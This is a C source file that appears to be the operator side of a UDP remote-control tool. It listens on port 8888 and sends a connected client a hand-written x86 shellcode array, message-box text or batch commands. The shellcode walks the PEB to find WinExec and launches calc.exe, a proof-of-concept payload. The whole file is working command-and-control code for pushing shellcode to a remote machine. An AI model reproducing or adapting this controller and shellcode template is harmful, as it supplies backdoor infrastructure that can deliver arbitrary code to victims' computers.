#include<stdio.h>
#include<winsock2.h>
#include "../Command.h"

#pragma comment(lib,"ws2_32.lib") //Winsock Library
#define BUFLEN 1024 //Max length of buffer
#define CMD_COUNT 2
#define PORT 8888
char buf[CMD_COUNT][BUFLEN] = { {
CMD_SHELL_CODE
// 0. open calc.exe
, 0x50
, 0x53
, 0x51
, 0x52
, 0x56
, 0x57
, 0x55
, 0x8B, 0xEC
, 0x83, 0xEC, 0x18
, 0x33, 0xF6
, 0x56
, 0x6A, 0x63
, 0x66, 0xB8, 0x78, 0x65
, 0x66, 0x50
, 0x68, 0x57, 0x69, 0x6E, 0x45
, 0x89, 0x65, 0xFC
, 0x33, 0xF6
, 0x64, 0x8B, 0x5E, 0x30
, 0x8B, 0x5B, 0x0C
, 0x8B, 0x5B, 0x14
, 0x8B, 0x1B
, 0x8B, 0x1B
, 0x8B, 0x5B, 0x10
, 0x89, 0x5D, 0xF8
, 0x33, 0xC0
, 0x8B, 0x43, 0x3C
, 0x03, 0xC3
, 0x8B, 0x40, 0x78
, 0x03, 0xC3
, 0x8B, 0x48, 0x24
, 0x03, 0xCB
, 0x89, 0x4D, 0xF4
, 0x8B, 0x78, 0x20
, 0x03, 0xFB
, 0x89, 0x7D, 0xF0
, 0x8B, 0x50, 0x1C
, 0x03, 0xD3
, 0x89, 0x55, 0xEC
, 0x8B, 0x58, 0x14
, 0x33, 0xC0
, 0x8B, 0x55, 0xF8
, 0x8B, 0x7D, 0xF0
, 0x8B, 0x75, 0xFC
, 0x33, 0xC9
, 0xFC
, 0x8B, 0x3C, 0x87
, 0x03, 0xFA
, 0x66, 0x83, 0xC1, 0x08
, 0xF3, 0xA6
, 0x74, 0x0A
, 0x40
, 0x3B, 0xC3
, 0x72, 0xE2
, 0x83, 0xC4, 0x26
, 0xEB, 0x23
, 0x8B, 0x4D, 0xF4
, 0x8B, 0xDA
, 0x8B, 0x55, 0xEC
, 0x66, 0x8B, 0x04, 0x41
, 0x8B, 0x04, 0x82
, 0x03, 0xC3
, 0x33, 0xD2
, 0x52
, 0x68, 0x63, 0x61, 0x6C, 0x63
, 0x8B, 0xF4
, 0x6A, 0x0A
, 0x56
, 0xFF, 0xD0
, 0x83, 0xC4, 0x2E
, 0x5D
, 0x5F
, 0x5E
, 0x5A
, 0x59
, 0x5B
, 0x58
, 0xC3
},
{0x00}
};
char batchRmDir[] = " rmdir /?\npause";//最前边预留一个空格
//The port on which to listen for incoming data
SOCKET sock;
struct sockaddr_in server;
int server_size = sizeof(server);
int recvfromTimeOutUDP(SOCKET socket, long sec, long usec)
{
	// Setup timeval variable
	struct timeval timeout;
	struct fd_set fds;
	timeout.tv_sec = sec;
	timeout.tv_usec = usec;
	// Setup fd_set structure
	FD_ZERO(&fds);
	FD_SET(socket, &fds);
	// Return value:
	// -1: error occurred
	// 0: timed out
	// > 0: data ready to be read
	return select(0, &fds, 0, 0, &timeout);
}
int main(void)
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(PORT);
	BOOL val = TRUE;
	setsockopt(sock, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (char *)&val, sizeof(val));
	struct timeval tv;
	tv.tv_sec = LONG_MAX;
	tv.tv_usec = LONG_MAX;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

	int result = bind(sock, (struct sockaddr *)& server, sizeof(server));
	if (result != 0) {
		fprintf(stderr, "bind failed");
	}

	while (true) {
		int selectTiming = recvfromTimeOutUDP(sock, LONG_MAX, LONG_MAX);
		if (selectTiming == 0) {
			// timeout
			continue;
		}
		else if (selectTiming == -1) {
			// error
			break;
		}
		else {
			// call recvfrom
			char recvBuf[BUFLEN];
			recvfrom(sock, recvBuf, BUFLEN, 0, (struct sockaddr *) & server, &server_size);
			printf("received: %s\n", recvBuf);
			while (true) {
				printf("msg to send: ");
				gets_s(recvBuf);
				printf("get content: 0x%X\n", recvBuf[0]);
				if (recvBuf[0] == CMD_SHELL_CODE) {
					printf("buf content: %s\n", buf[0]);
				    int r = sendto(sock, buf[0], BUFLEN, 0, (struct sockaddr*)&server, server_size);
					printf("send result: %d\n", r);
				}
				else if (recvBuf[0] == CMD_MSG_BOX) {
					printf("content to be sent: %s\n", recvBuf);
					int r = sendto(sock, recvBuf, BUFLEN, 0, (struct sockaddr*)&server, server_size);
					printf("send result: %d\n", r);
				}
				else if (recvBuf[0] == CMD_BATCH) {
					batchRmDir[0] = CMD_BATCH;
					printf("content to be sent: %s\n", batchRmDir);
					int r = sendto(sock, batchRmDir, BUFLEN, 0, (struct sockaddr*)&server, server_size);
					printf("send result: %d\n", r);
				}
				else {
					recvBuf[0] = CMD_NOPE;
					recvBuf[1] = 0;
					printf("content to be sent: %s\n", recvBuf);
					int r = sendto(sock, recvBuf, BUFLEN, 0, (struct sockaddr*)&server, server_size);
					printf("send result: %d\n", r);
				}
				recvfrom(sock, recvBuf, BUFLEN, 0, (struct sockaddr *) & server, &server_size);
				printf("result: %s\n", recvBuf);
			}
		}
	}
	closesocket(sock);
	WSACleanup();
	return 0;
}